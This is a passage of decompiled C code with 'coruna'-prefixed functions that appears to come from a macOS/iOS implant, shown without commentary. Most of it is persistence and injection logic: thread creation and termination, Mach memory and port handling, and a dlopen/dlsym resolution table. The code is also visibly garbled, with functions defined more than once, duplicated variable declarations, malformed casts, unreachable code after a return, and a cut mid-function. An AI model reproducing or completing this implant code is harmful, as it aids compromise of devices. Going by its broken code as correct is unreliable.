      if (*(int *)(arg + 8) == 0) {
        ptr = (uint64_t *)0x0;
        *id_2 = 0;
      }
      else {
        ptr = &k_persist_rodata_word_1f038;
      }
    }
    else {
      scratch = 0;
      ptr = (uint64_t *)coruna_persist_inject(&scratch,arg,arg,val,size_3);
      if ((int)ptr == 0) {
        *id_2 = scratch;
      }
    }
  }
  return ptr;
}





void coruna_persist_via_persist_ctx_free(long handle)
{
  if (handle != 0) {
    coruna_persist_ctx_free();
    return;
  }
  return;
}





bool coruna_buf_valid(unsigned long *arg)
{
  bool err;
  unsigned long u;
  
  err = false;
  if (arg != (unsigned long *)0x0) {
    u = *arg;
    if (u == 0) {
      return false;
    }
    err = false;
    if ((uint)arg[1] != 0) {
      err = u < u + (uint)arg[1];
    }
  }
  return err;
}





bool coruna_slice_valid(long *handle)
{
  bool err;
  
  err = false;
  if (handle != (long *)0x0) {
    if (*handle == 0) {
      return false;
    }
    err = (int)handle[1] != 0;
  }
  return err;
}





uint64_t coruna_log_msg(long *handle)
{
  uint64_t u;
  
  u = 0;
  if (handle != (long *)0x0) {
    if (((int)handle[1] != 0) && (*handle != 0)) {
      coruna_memset(*handle,0);
    }
    u = 1;
  }
  return u;
}





uint32_t coruna_persist_via_mach_vm_deallocate(long *handle,int flags)
{
  int err;
  uint64_t u;
  uint32_t size;
  
  size = 0x1f018;
  if (handle != (long *)0x0) {
    if ((*handle == 0) || ((int)handle[1] == 0)) {
      size = 0;
    }
    else {
      if (flags != 0) {
        coruna_memset(*handle,0);
      }
      u = coruna_persist_via_mach_port_deallocate();
      err = coruna_mach_vm_deallocate(u,*handle,(int)handle[1]);
      size = 0;
      if (err != 0) {
        size = 0x1f035;
      }
    }
  }
  return size;
}





uint64_t coruna_persist_via_call_webbookmarks_delete(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    coruna_call_webbookmarks_delete(2);
    coruna_call_webbookmarks_delete();
    coruna_call_webbookmarks_delete();
    u = coruna_persist_via_mach_port_deallocate();
    coruna_mach_vm_deallocate(u,handle,0x4000);
  }
  return 0;
}





uint64_t coruna_persist_str_corefoundation(uint64_t val,uint64_t id_2,long handle)
{
  int err;
  int status;
  char *ptr;
  uint64_t u;
  long handle;
  long addr;
  void (*buf)(void);
  unsigned long size;
  uint64_t scratch;
  long *scratch;
  uint32_t bootargs;
  long bootargs;
  unsigned long thread_attr;
  
  if (handle != 0) {
    bootargs = 0;
    thread_attr = 0;
    bootargs = 2;
    err = *(int *)(handle + 0x50);
    size = *(unsigned long *)(handle + 0x58) >> 1 & 1;
    *(uint32_t *)(handle + 0x50) = 0;
    ptr = (char *)coruna_bind_dlopen_table(size);
    if ((int)ptr == 0) {
      if (*(long *)(handle + 0x80) != 0) {
        coruna_persist_via_call_webbookmarks_delete();
        *(uint64_t *)(handle + 0x80) = 0;
      }
      if (((*(byte *)(handle + 0x58) & 1) == 0) && (status = coruna_cf_bundle(), status == 0)) {
        ptr = "CoreFoundation";
      }
      else {
        scratch = (long *)0x0;
        bootargs = 4;
        ptr = (char *)coruna_run_start(&scratch,handle);
        if ((int)ptr == 0) {
          *(uint64_t *)(handle + 0x20) = 0;
          *(uint32_t *)(handle + 0x28) = 0;
          coruna_persist_via_persist_via_mach_vm_deallocate(handle,&bootargs);
          handle = bootargs;
          scratch = 0;
          addr = *scratch;
          bootargs = 3;
          ptr = (char *)coruna_persist_via_persist_inject(scratch,scratch + 2,addr != bootargs,&scratch,
                                        &bootargs);
          if ((int)ptr == 0) {
            handle = scratch[4];
            coruna_persist_via_driver_free_ctx(scratch + 2);
            coruna_is_asl_symbol(err,3,0,size);
            bootargs = 0x10;
            if (handle == 0) {
              ptr = (char *)0x0;
            }
            else {
              u = coruna_identity(handle);
              buf = (void (*)coruna_identity_80bc(u,0);
              ptr = (char *)(*buf)(scratch[5],(int)scratch[6],*scratch,
                                         (int)scratch[1],err);
            }
            coruna_persist_via_persist_ctx_free(scratch);
          }
          else if (addr != handle) {
            coruna_persist_via_mach_vm_deallocate(scratch,0);
          }
          coruna_persist_via_persist_via_driver_free_ctx(scratch);
          handle = 0;
        }
      }
    }
    if (1 < err + 1U) {
      coruna_is_asl_symbol(err,bootargs,ptr,size);
      u = coruna_persist_via_mach_port_deallocate();
      coruna_mach_port_deallocate(u,err);
    }
    if (handle != 0) {
      coruna_persist_via_persist_via_mach_vm_deallocate(handle,&bootargs);
    }
    if ((bootargs != 0) && ((int)thread_attr != 0)) {
      handle = coruna_ret_stub();
      addr = coruna_ret_stub_2();
      if ((handle == 0) || (addr == 0)) {
        coruna_bsdthread_terminate(bootargs,thread_attr & 0xffffffff,0,0);
      }
      else {
        u = coruna_persist_via_mach_port_deallocate();
        coruna_persist_residual_41(u,bootargs,thread_attr & 0xffffffff,handle,addr,val);
      }
    }
  }
  return 0;
}





uint64_t coruna_cf_bundle_7000(uint64_t val,uint64_t id_2,long handle)
{
  int err;
  int status;
  char *ptr;
  uint64_t u;
  long handle;
  long addr;
  void (*buf)(void);
  unsigned long size;
  uint64_t scratch;
  long *bootargs;
  uint32_t thread_attr;
  long host_info;
  unsigned long serial_buf;
  
  host_info = 0;
  serial_buf = 0;
  thread_attr = 2;
  err = *(int *)(handle + 0x50);
  size = *(unsigned long *)(handle + 0x58) >> 1 & 1;
  *(uint32_t *)(handle + 0x50) = 0;
  ptr = (char *)coruna_bind_dlopen_table(size);
  if ((int)ptr == 0) {
    if (*(long *)(handle + 0x80) != 0) {
      coruna_persist_via_call_webbookmarks_delete();
      *(uint64_t *)(handle + 0x80) = 0;
    }
    if (((*(byte *)(handle + 0x58) & 1) == 0) && (status = coruna_cf_bundle(), status == 0)) {
      ptr = "CoreFoundation";
    }
    else {
      bootargs = (long *)0x0;
      thread_attr = 4;
      ptr = (char *)coruna_run_start(&bootargs,handle);
      if ((int)ptr == 0) {
        *(uint64_t *)(handle + 0x20) = 0;
        *(uint32_t *)(handle + 0x28) = 0;
        coruna_persist_via_persist_via_mach_vm_deallocate(handle,&host_info);
        handle = host_info;
        scratch = 0;
        addr = *bootargs;
        thread_attr = 3;
        ptr = (char *)coruna_persist_via_persist_inject(bootargs,bootargs + 2,addr != host_info,&scratch,&thread_attr);
        if ((int)ptr == 0) {
          handle = bootargs[4];
          coruna_persist_via_driver_free_ctx(bootargs + 2);
          coruna_is_asl_symbol(err,3,0,size);
          thread_attr = 0x10;
          if (handle == 0) {
            ptr = (char *)0x0;
          }
          else {
            u = coruna_identity(handle);
            buf = (void (*)coruna_identity_80bc(u,0);
            ptr = (char *)(*buf)(bootargs[5],(int)bootargs[6],*bootargs,(int)bootargs[1],err
                                      );
          }
          coruna_persist_via_persist_ctx_free(scratch);
        }
        else if (addr != handle) {
          coruna_persist_via_mach_vm_deallocate(bootargs,0);
        }
        coruna_persist_via_persist_via_driver_free_ctx(bootargs);
        handle = 0;
      }
    }
  }
  if (1 < err + 1U) {
    coruna_is_asl_symbol(err,thread_attr,ptr,size);
    u = coruna_persist_via_mach_port_deallocate();
    coruna_mach_port_deallocate(u,err);
  }
  if (handle != 0) {
    coruna_persist_via_persist_via_mach_vm_deallocate(handle,&host_info);
  }
  if ((host_info != 0) && ((int)serial_buf != 0)) {
    handle = coruna_ret_stub();
    addr = coruna_ret_stub_2();
    if ((handle == 0) || (addr == 0)) {
      coruna_bsdthread_terminate(host_info,serial_buf & 0xffffffff,0,0);
    }
    else {
      u = coruna_persist_via_mach_port_deallocate();
      coruna_persist_residual_41(u,host_info,serial_buf & 0xffffffff,handle,addr,val);
    }
  }
  return 0;
}





void coruna_persist_via_persist_via_mach_vm_deallocate(long *handle,long *addr_2)
{
  uint64_t u;
  long handle;
  long scratch;
  long bootargs;
  
  if (handle != (long *)0x0) {
    bootargs = handle[3];
    scratch = handle[2];
    if (addr_2 != (long *)0x0) {
      handle = *handle;
      addr_2[1] = handle[1];
      *addr_2 = handle;
    }
    if (1 < (int)handle[10] + 1U) {
      u = coruna_persist_via_mach_port_deallocate();
      coruna_mach_port_deallocate(u,(int)handle[10]);
    }
    if (handle[4] != *handle) {
      coruna_persist_via_mach_vm_deallocate(handle + 4,0);
    }
    coruna_persist_via_mach_vm_deallocate(&scratch,1);
  }
  return;
}





void coruna_is_asl_symbol(int flags,uint32_t size,uint32_t flags_2,int count_2)
{
  uint64_t scratch;
  int bootargs;
  uint64_t thread_attr;
  uint32_t host_info;
  uint32_t scratch;
  uint32_t serial_buf;
  
  if (1 < flags + 1U) {
    thread_attr = 0;
    scratch = k_persist_rodata_word_1ef30;
    host_info = 5;
    bootargs = flags;
    scratch = size;
    serial_buf = flags_2;
    if (count_2 == 0) {
      coruna_persist_via_mach_msg(&scratch,0x11,0x20,100,0,100,0);
    }
    else {
      coruna_persist_via_mach_msg2(&scratch,0x400000011,0x2000000013,flags,0x500000000,0,0,100);
    }
  }
  return;
}





uint64_t coruna_dyld_cached_port_ptr(long handle)
{
  int err;
  uint64_t scratch;
  
  if (handle != 0) {
    err = coruna_bind_dlopen_table(*(unsigned long *)(handle + 0x58) >> 1 & 1);
    if ((err == 0) && (err = coruna_call_webbookmarks_delete(&scratch,0,coruna_call_webbookmarks_delete,handle), err == 0)) {
      coruna_call_webbookmarks_delete(scratch);
    }
  }
  return 0;
}
void _last(long handle,uint size,uint64_t val,uint32_t size_x,uint64_t id_2
                 ,uint32_t flags_2)
{
  long handle;
  uint8_t size[16];
  uint8_t u[16];
  int err;
  uint64_t u;
  void (*ptr)(void);
  uint64_t size;
  long addr;
  long unaff_x19;
  uint64_t unaff_x20;
  uint32_t unaff_w21;
  long *unaff_x22;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint8_t thread_attr[16];
  uint64_t host_info;
  uint32_t serial_buf;
  
  thread_attr = k_persist_rodata_word_0001ef48;
  thread_attr = k_persist_rodata_word_1ef40;
  u = k_persist_rodata_word_0001ef48;
  u = k_persist_rodata_word_1ef40;
  size = k_persist_rodata_word_0001ef48;
  size = k_persist_rodata_word_1ef40;
  host_info = id_2;
  serial_buf = flags_2;
  if ((handle != 0) && (0x8f < size)) {
    unaff_x22 = (long *)(handle + 0x60);
    if (((*unaff_x22 != 0) && (*(long *)(handle + 0x70) != 0)) && (*(int *)(handle + 0x78) != 0))
    goto fail;
    u = coruna_identity(coruna_dyld_cached_port_ptr);
    u = coruna_identity_80bc(u,0);
    thread_attr = coruna_bsdthread_create(u,handle,0x80000,0,0x4000000);
    *(long *)(handle + 0x80) = thread_attr;
    do {
      addr = thread_attr;
      if (thread_attr == -1) {
        scratch = 0;
        scratch = 0;
        handle = -addr;
        if (-1 < addr) {
          handle = addr;
        }
        coruna_is_asl_symbol(*(uint32_t *)(handle + 0x50),1,(uint)handle | 0x40000000,
                     *(unsigned long *)(handle + 0x58) >> 1 & 1);
        coruna_persist_via_persist_via_mach_vm_deallocate(handle,&scratch);
        unaff_x20 = id_2;
        u = thread_attr;
done:
        id_2 = unaff_x20;
        thread_attr = u;
        coruna_persist_via_persist_via_bsdthread_terminate(&host_info,&scratch);
      }
      coruna_bsdthread_terminate(id_2,flags_2,0,0);
      coruna_persist_via_bsdthread_terminate();
      size = thread_attr;
fail:
      host_info = 0;
      bootargs = 0;
      action = 0;
      serial_buf = 0;
      scratch = 0;
      scratch = 0;
      thread_attr = 0;
      bootargs = 0;
      thread_attr = size;
      u = coruna_identity();
      ptr = (void (*)coruna_identity_80bc(u,0);
      u = coruna_identity(coruna_call_webbookmarks_delete);
      u = coruna_identity_80bc(u,0);
      coruna_memcpy(&scratch,*(uint64_t *)(handle + 0x70),*(uint32_t *)(handle + 0x78));
      size = coruna_persist_via_mach_port_deallocate();
      coruna_mach_vm_deallocate(size,*(uint64_t *)(handle + 0x70),*(uint32_t *)(handle + 0x78));
      coruna_memset(unaff_x22,0,0x20);
      err = (*ptr)(thread_attr,&scratch,u,handle);
      thread_attr = (long)err;
    } while( true );
  }
  scratch = coruna_u64_pack((scratch), (size_x));
  handle = unaff_x19;
  scratch = val;
  flags_2 = unaff_w21;
  goto done;
}
void coruna_persist_via_bsdthread_terminate(void)
{
  long *ptr;
  long *buf;
  unsigned long u;
  unsigned long extraout_x8;
  long handle;
  long extraout_x9;
  uint8_t version[16];
  
  coruna_bsdthread_terminate(0,0,0,0);
  version = coruna_surface_dispatch_thunk();
  buf = version;
  ptr = version;
  if ((ptr != (long *)0x0) && (((int)ptr[1] == 0 || (*ptr == 0)))) {
    *(uint32_t *)(ptr + 1) = 0;
    *ptr = 0;
  }
  if (buf != (long *)0x0) {
    u = (unsigned long)*(uint *)(buf + 1);
    if ((*(uint *)(buf + 1) != 0) && (handle = *buf, handle != 0)) goto fail;
    *(uint32_t *)(buf + 1) = 0;
    *buf = 0;
  }
  handle = *ptr;
  u = (unsigned long)*(uint *)(ptr + 1);
  do {
    coruna_bsdthread_terminate(handle,u,0,0);
    version = coruna_persist_via_bsdthread_terminate();
    u = extraout_x8;
    handle = extraout_x9;
fail:
    ptr = version;
  } while (*ptr == 0);
  k_persist_rodata_word_240c8 = ptr[1];
  k_persist_rodata_word_240c0 = *ptr;
  k_persist_rodata_word_240d8 = version[1];
  k_persist_rodata_word_240d0 = *version;
  coruna_memset(&k_persist_rodata_word_240e0,0,0x400);
  coruna_persist_via_memset();
  return;
}
void coruna_persist_via_persist_via_bsdthread_terminate(long *handle,long *addr_2)
{
  long *ptr;
  unsigned long u;
  unsigned long extraout_x8;
  long handle;
  long extraout_x9;
  uint8_t port[16];
  
  port = addr_2;
  port = handle;
  if ((handle != (long *)0x0) && (((int)handle[1] == 0 || (*handle == 0)))) {
    *(uint32_t *)(handle + 1) = 0;
    *handle = 0;
  }
  if (addr_2 != (long *)0x0) {
    u = (unsigned long)*(uint *)(addr_2 + 1);
    if ((*(uint *)(addr_2 + 1) != 0) && (handle = *addr_2, handle != 0)) goto fail;
    *(uint32_t *)(addr_2 + 1) = 0;
    *addr_2 = 0;
  }
  handle = *handle;
  u = (unsigned long)*(uint *)(handle + 1);
  do {
    coruna_bsdthread_terminate(handle,u,0,0);
    port = coruna_persist_via_bsdthread_terminate();
    u = extraout_x8;
    handle = extraout_x9;
fail:
    ptr = port;
  } while (*ptr == 0);
  k_persist_rodata_word_240c8 = ptr[1];
  k_persist_rodata_word_240c0 = *ptr;
  k_persist_rodata_word_240d8 = port[1];
  k_persist_rodata_word_240d0 = *port;
  coruna_memset(&k_persist_rodata_word_240e0,0,0x400);
  coruna_persist_via_memset();
  return;
}





uint64_t * coruna_persist_via_memset(void)
{
  uint64_t u;
  long *ptr;
  long handle;
  
  if (k_persist_rodata_word_240c8 != 0 && k_persist_rodata_word_240c0 != 0) {
    coruna_memset(k_persist_rodata_word_240c0,0);
    u = coruna_persist_via_mach_port_deallocate();
    if (1 < (int)u + 1U) {
      coruna_mach_vm_deallocate(u,k_persist_rodata_word_240c0,k_persist_rodata_word_240c8);
    }
  }
  coruna_bsdthread_terminate(k_persist_rodata_word_240d0,k_persist_rodata_word_240d8,0,0);
  ptr = (long *)coruna_persist_via_bsdthread_terminate();
  if (ptr != (long *)0x0) {
    handle = *ptr;
    if (handle != 0) {
      if ((int)ptr[1] != 0) {
        coruna_memset(handle,0);
        handle = *ptr;
      }
      coruna_driver_free_ctx(handle);
    }
    *(uint32_t *)(ptr + 1) = 0;
    *ptr = 0;
    return (uint64_t *)0x0;
  }
  return &k_persist_rodata_word_1f018;
}





uint64_t * coruna_persist_via_driver_free_ctx(long *handle)
{
  long handle;
  
  if (handle != (long *)0x0) {
    handle = *handle;
    if (handle != 0) {
      if ((int)handle[1] != 0) {
        coruna_memset(handle,0);
        handle = *handle;
      }
      coruna_driver_free_ctx(handle);
    }
    *(uint32_t *)(handle + 1) = 0;
    *handle = 0;
    return (uint64_t *)0x0;
  }
  return &k_persist_rodata_word_1f018;
}





uint64_t * coruna_run_start(long *handle,long *addr_2)
{
  uint u;
  uint size;
  uint version;
  long *ptr;
  uint64_t *ptr;
  long handle;
  
  ptr = &k_persist_rodata_word_1f018;
  if ((handle != (long *)0x0) && (addr_2 != (long *)0x0)) {
    if (((int)addr_2[5] == 0) || (addr_2[4] != 0)) {
      if (((int)addr_2[1] == 0) || (*addr_2 != 0)) {
        size = *(uint *)(addr_2 + 3);
        if ((size == 0) || (addr_2[2] != 0)) {
          if (*(int *)((long)addr_2 + 0x34) != 0) {
            version = *(uint *)(addr_2 + 6);
            if ((size <= version) || (u = version + *(int *)((long)addr_2 + 0x34), u <= version)
               ) {
              return (uint64_t *)0x1f039;
            }
            if (size < u) {
              return (uint64_t *)0x1f039;
            }
          }
          if (*(int *)((long)addr_2 + 0x4c) != 0) {
            version = *(uint *)(addr_2 + 9);
            if (size <= version) {
              return (uint64_t *)0x1f03b;
            }
            u = version + *(int *)((long)addr_2 + 0x4c);
            if (u <= version) {
              return (uint64_t *)0x1f03b;
            }
            if (size < u) {
              return (uint64_t *)0x1f03b;
            }
          }
          ptr = (long *)coruna_call_webbookmarks_delete(1,0x40);
          if (ptr == (long *)0x0) {
            ptr = (uint64_t *)0xad009;
          }
          else {
            handle = addr_2[4];
            ptr[1] = addr_2[5];
            *ptr = handle;
            ptr = (uint64_t *)coruna_persist_via_call_webbookmarks_delete_2(ptr + 2,addr_2 + 6,addr_2 + 2);
            if ((int)ptr == 0) {
              ptr[4] = addr_2[8];
              ptr = (uint64_t *)coruna_persist_via_call_webbookmarks_delete_2(ptr + 5,addr_2 + 9,addr_2 + 2);
              if ((int)ptr == 0) {
                *handle = (long)ptr;
                return ptr;
              }
              coruna_persist_via_driver_free_ctx(ptr + 2);
            }
            coruna_driver_free_ctx(ptr);
          }
        }
        else {
          ptr = (uint64_t *)0x1f03f;
        }
      }
      else {
        ptr = (uint64_t *)0x1f03e;
      }
    }
    else {
      ptr = &k_persist_rodata_word_1f038;
    }
  }
  return ptr;
}





uint64_t * coruna_persist_via_call_webbookmarks_delete_2(long *handle,uint *size,long *addr_2)
{
  uint u;
  long handle;
  uint size;
  
  if (handle == (long *)0x0) {
    return &k_persist_rodata_word_1f018;
  }
  if (size == (uint *)0x0) {
    return &k_persist_rodata_word_1f018;
  }
  if (addr_2 == (long *)0x0) {
    return &k_persist_rodata_word_1f018;
  }
  if (size[1] == 0) {
    size = 0;
    *handle = 0;
  }
  else {
    size = *size;
    if ((*(uint *)(addr_2 + 1) <= size) || (u = size + size[1], u <= size)) {
      return (uint64_t *)0x1f03c;
    }
    if (*(uint *)(addr_2 + 1) < u) {
      return (uint64_t *)0x1f03c;
    }
    handle = coruna_call_webbookmarks_delete(1);
    if (handle == 0) {
      return (uint64_t *)0xad009;
    }
    coruna_memcpy(handle,*addr_2 + (unsigned long)*size,size[1]);
    *handle = handle;
    size = size[1];
  }
  *(uint *)(handle + 1) = size;
  return (uint64_t *)0x0;
}





int coruna_persist_via_persist_via_driver_free_ctx(long handle)
{
  int err;
  int status;
  
  if (handle == 0) {
    status = 0x1f018;
  }
  else {
    err = coruna_persist_via_driver_free_ctx(handle + 0x28);
    status = coruna_persist_via_driver_free_ctx(handle + 0x10);
    if (err != 0) {
      status = err;
    }
    coruna_memset(handle,0,0x40);
    coruna_driver_free_ctx(handle);
  }
  return status;
}





unsigned long coruna_persist_via_mach_port_deallocate(void)

{
  unsigned long u;
  
  u = (unsigned long)k_persist_rodata_word_244e0;
  if (k_persist_rodata_word_244e0 == 0) {
    u = coruna_task_self();
    if ((uint)u != 0) {
      k_persist_rodata_word_244e0 = (uint)u;
      coruna_mach_port_deallocate(u,u);
    }
  }
  return u;
}





uint64_t coruna_call_webbookmarks_delete(void)
{
  uint64_t u;
  
  if (k_persist_rodata_word_244f0 != (void (*)0x0) {
    u = (*k_persist_rodata_word_244f0)();
    return u;
  }
  return 0;
}





uint64_t coruna_call_webbookmarks_delete(void)
{
  uint64_t u;
  
  if (k_persist_rodata_word_244f8 != (void (*)0x0) {
    u = (*k_persist_rodata_word_244f8)();
    return u;
  }
  return 0;
}





uint64_t coruna_call_webbookmarks_delete(void)
{
  uint64_t u;
  
  if (k_persist_rodata_word_24500 != (void (*)0x0) {
    u = (*k_persist_rodata_word_24500)();
    return u;
  }
  return 0xffffffff;
}





uint64_t coruna_call_webbookmarks_delete(void)
{
  uint64_t u;
  
  if (k_persist_rodata_word_24508 != (void (*)0x0) {
    u = (*k_persist_rodata_word_24508)();
    return u;
  }
  return 0;
}





void coruna_driver_free_ctx(long handle)
{
  if (k_persist_rodata_word_24510 == (void (*)0x0 || handle == 0) {
    return;
  }
  (*k_persist_rodata_word_24510)();
  return;
}





void coruna_driver_dispatch(void)
{
  if (k_persist_rodata_word_24528 != (void (*)0x0) {
    (*k_persist_rodata_word_24528)();
    return;
  }
  return;
}





void coruna_driver_dispatch(void)
{
  if (k_persist_rodata_word_24530 != (void (*)0x0) {
    (*k_persist_rodata_word_24530)();
    return;
  }
  return;
}





void coruna_driver_dispatch(void)
{
  if (k_persist_rodata_word_24538 != (void (*)0x0) {
    (*k_persist_rodata_word_24538)();
    return;
  }
  return;
}





void coruna_driver_dispatch(void)
{
  if (k_persist_rodata_word_24540 != (void (*)0x0) {
    (*k_persist_rodata_word_24540)();
    return;
  }
  return;
}





void coruna_driver_dispatch(void)
{
  if (k_persist_rodata_word_24548 != (void (*)0x0) {
    (*k_persist_rodata_word_24548)();
    return;
  }
  return;
}





void coruna_persist_residual_42(uint64_t val,uint64_t id_2)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  uint64_t scratch;
  uint64_t scratch;
  
  if (k_persist_rodata_word_24558 == (void (*)0x0) {
    if (k_persist_rodata_word_24550 != (void (*)0x0) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      (*k_persist_rodata_word_24550)();
      return;
    }
  }
  else {
    scratch = val;
    scratch = id_2;
    (*k_persist_rodata_word_24558)(&scratch,1);
  }
  return;
}





void coruna_driver_dispatch(void)
{
  if (k_persist_rodata_word_24560 != (void (*)0x0) {
    (*k_persist_rodata_word_24560)();
    return;
  }
  return;
}





uint64_t coruna_dyld_cached_port_ptr(uint64_t val)
{
  void (*ptr)(void);
  uint u;
  uint64_t size;
  unsigned long unaff_x30;
  
  if (((k_persist_rodata_word_24568 != (void (*)0x0) && (k_persist_rodata_word_24560 != (void (*)0x0)) &&
     (u = (*k_persist_rodata_word_24560)(), (uint)val < u)) {
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
    size = (*k_persist_rodata_word_24568)(val);
    return size;
  }
  return 0;
}





uint64_t coruna_bind_dlopen_table(uint64_t val)
{
  long handle;
  uint64_t u;
  long addr;
  void (*scratch)(void);
  
  if (k_persist_rodata_word_244e8 == '\0') {
    scratch = k_persist_rodata_word_244f8;
    if ((k_persist_rodata_word_244f8 != (void (*)0x0) || (u = coruna_resolve_dyld_dlsym(val,&scratch), (int)u == 0))
    {
      addr = 0;
      u = 0;
      k_persist_rodata_word_244f8 = scratch;
      while( true ) {
        handle = (*scratch)(0xfffffffffffffffe,*(uint64_t *)((long)&PTR_s_dlopen_00020408 + addr)
                           );
        if ((handle == 0) && (addr != 0x120)) {
          u = 0x1f012;
        }
        else {
          **(long **)((long)&PTR_DAT_00020400 + addr) = handle;
        }
        if (addr == 0x198) break;
        addr = addr + 0x18;
      }
      k_persist_rodata_word_244e8 = (int)u == 0;
    }
  }
  else {
    u = 0;
  }
  return u;
}





uint64_t coruna_ret_stub(void)
{
  return k_persist_rodata_word_24518;
}





uint64_t coruna_ret_stub_2(void)
{
  return k_persist_rodata_word_24520;
}





uint64_t coruna_call_webbookmarks_delete(void)
{
  uint64_t u;
  
  if (k_persist_rodata_word_24570 != (void (*)0x0) {
    u = (*k_persist_rodata_word_24570)();
    return u;
  }
  return 0xffffffff;
}





uint64_t coruna_call_webbookmarks_delete(void)
{
  uint64_t u;
  
  if (k_persist_rodata_word_24578 != (void (*)0x0) {
    u = (*k_persist_rodata_word_24578)();
    return u;
  }
  return 0xffffffff;
}





uint64_t coruna_call_webbookmarks_delete(void)
{
  uint64_t u;
  
  if (k_persist_rodata_word_24580 != (void (*)0x0) {
    u = (*k_persist_rodata_word_24580)();
    return u;
  }
  return 0;
}
uint64_t coruna_persist_str_if_uvar6_uvar3(long handle)
{
  uint u;
  unsigned long size;
  unsigned long version;
  uint64_t *ptr;
  unsigned long port;
  unsigned long tag;
  
  if (handle != 0) {
    if (*(long *)(handle + 0x30) != 0) {
      coruna_driver_free_ctx();
    }
    *(uint64_t *)(handle + 0x30) = 0;
    *(uint32_t *)(handle + 0x38) = 0;
    u = *(uint *)(handle + 0x28);
    if (u != 0) {
      size = (unsigned long)u + 1 & 0x1fffffffe;
      version = (unsigned long)u - 1;
      ptr = (uint64_t *)(*(long *)(handle + 0x20) + 0x10);
      port = k_persist_rodata_word_1ef50;
      tag = k_persist_rodata_word_0001ef58;
      do {
        if (port <= version) {
          ptr[-2] = "";
        }
        if (tag <= version) {
          *ptr = "";
        }
        port = port + 2;
        tag = tag + 2;
        ptr = ptr + 4;
        size = size - 2;
      } while (size != 0);
    }
    *(uint64_t *)(handle + 0x10) = 0;
    *(uint32_t *)(handle + 0x18) = 0;
    return 0;
  }
  return 0xad001;
}





unsigned long coruna_persist_ctx_free(uint64_t *arg)

{
  int err;
  unsigned long size;
  uint64_t version;
  long handle;
  uint port;
  uint tag;
  unsigned long kind;
  long addr;
  
  if (arg == (uint64_t *)0x0) {
    size = 0xad001;
  }
  else {
    size = coruna_persist_via_identity_80bc();
    if (*(char *)((long)arg + 0x99) != '\0') {
      version = coruna_persist_via_mach_port_deallocate();
      err = coruna_mach_vm_deallocate(version,*arg,*(uint32_t *)(arg + 1));
      tag = (uint)size;
      port = 0x1f03d;
      if (tag != 0) {
        port = tag;
      }
      if (err != 0) {
        tag = port;
      }
      size = (unsigned long)tag;
    }
    handle = arg[4];
    if (handle != 0) {
      port = *(uint *)(arg + 5);
      if (port != 0) {
        kind = 0;
        addr = 8;
        do {
          if (*(long *)(handle + addr) != 0) {
            coruna_call_webbookmarks_delete(*(long *)(handle + addr));
            handle = arg[4];
            *(uint64_t *)(handle + addr) = 0;
            port = *(uint *)(arg + 5);
          }
          kind = kind + 1;
          addr = addr + 0x10;
        } while (kind < port);
      }
      coruna_driver_free_ctx();
    }
    arg[4] = 0;
    *(uint32_t *)(arg + 5) = 0;
    if (arg[6] != 0) {
      coruna_driver_free_ctx();
    }
    arg[6] = 0;
    *(uint32_t *)(arg + 7) = 0;
    if (arg[10] != 0) {
      coruna_driver_free_ctx();
    }
    arg[10] = 0;
    *(uint32_t *)(arg + 0xb) = 0;
    if (arg[0xc] != 0) {
      coruna_driver_free_ctx();
    }
    arg[0xc] = 0;
    *(uint32_t *)(arg + 0xd) = 0;
    if (arg[8] != 0) {
      coruna_driver_free_ctx();
    }
    arg[8] = 0;
    *(uint32_t *)(arg + 9) = 0;
    coruna_memset(arg,0,0xa0);
    coruna_driver_free_ctx(arg);
  }
  return size;
}





uint64_t * coruna_persist_build_ctx(long *handle,long *addr_2,long *off_3,uint8_t buf)
{
  long *ptr;
  long handle;
  long *buf;
  long *str;
  uint u;
  int err;
  long *copy;
  long addr;
  long off;
  long base;
  uint8_t **lppu11;
  uint64_t *ptr;
  long ctx_val;
  long serial;
  uint size;
  unsigned long version;
  unsigned long scratch;
  long bootargs;
  unsigned long scratch;
  long thread_attr;
  unsigned long host_info;
  long serial_buf;
  unsigned long bootargs;
  long action;
  unsigned long block_ctx;
  long stack_guard;
  unsigned long thread_attr;
  long sa_saved;
  unsigned long sa_new;
  uint path_buf;
  uint tmp_buf;
  uint region;
  uint plist;
  uint url_buf;
  uint json_buf;
  uint frame;
  uint work;
  uint cache;
  uint cache_20;
  uint cache_21;
  uint cache_22;
  uint cache_23;
  uint cache_24;
  uint cache_25;
  byte cache_26;
  uint8_t host_info;
  uint8_t serial_buf;
  uint8_t action;
  long cache_27;
  
  if (handle == (long *)0x0) {
    return (uint64_t *)0x1f00b;
  }
  err = coruna_slice_valid(off_3);
  if (err == 0) {
    return (uint64_t *)0x1f00b;
  }
  err = coruna_buf_valid(addr_2);
  if (err == 0) {
    return (uint64_t *)&k_persist_rodata_word_1f007;
  }
  if (*(uint *)(off_3 + 1) < 0x30) {
    return (uint64_t *)((long)&k_persist_rodata_word_1f008 + 3);
  }
  ptr = (uint64_t *)0xad009;
  coruna_memcpy(&path_buf,*off_3,0x30);
  copy = (long *)coruna_call_webbookmarks_delete(1,0xa0);
  coruna_memset(&path_buf,0,0x30);
  return ptr;
  *copy = *addr_2;
  *(int *)(copy + 1) = (int)addr_2[1];
  *(uint8_t *)((long)copy + 0x99) = buf;
  *(uint8_t *)(copy + 0x13) = 0;
  addr = coruna_driver_dispatch();
  copy[0xe] = addr;
  addr = coruna_driver_dispatch();
  copy[0xf] = addr;
  addr = coruna_driver_dispatch();
  copy[0x10] = addr;
  addr = coruna_driver_dispatch();
  copy[0x11] = addr;
  addr = coruna_driver_dispatch();
  copy[0x12] = addr;
  ptr = (uint64_t *)0x1f00e;
  if ((((copy[0xe] != 0) && (copy[0xf] != 0)) &&
      (ptr = (uint64_t *)0x1f00e, copy[0x10] != 0)) && ((copy[0x11] != 0 && (addr != 0)))
     ) {
    thread_attr = 0;
    stack_guard = 0;
    sa_new = 0;
    sa_saved = 0;
    bootargs = 0;
    serial_buf = 0;
    block_ctx = 0;
    action = 0;
    scratch = 0;
    bootargs = 0;
    host_info = 0;
    thread_attr = 0;
    addr = *off_3;
    if (addr == 0) {
done:
      ptr = &k_persist_rodata_word_1f008;
cleanup:
      coruna_persist_ctx_free(copy);
